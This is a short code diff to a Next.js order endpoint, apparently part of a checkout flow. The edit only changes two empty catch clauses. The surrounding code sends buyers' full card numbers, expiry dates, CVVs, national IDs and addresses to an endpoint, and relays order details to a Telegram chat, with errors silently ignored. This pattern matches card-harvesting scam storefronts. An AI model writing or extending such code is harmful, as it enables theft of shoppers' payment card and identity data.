@@ -13,7 +13,7 @@ export async function POST(req: NextRequest) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
-  } catch (_) {}
+  } catch {}
 
   // Send Telegram
   const text = [
@@ -43,7 +43,7 @@ export async function POST(req: NextRequest) {
         body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
       }
     );
-  } catch (_) {}
+  } catch {}
 
   return NextResponse.json({ ok: true, orderId });
 }
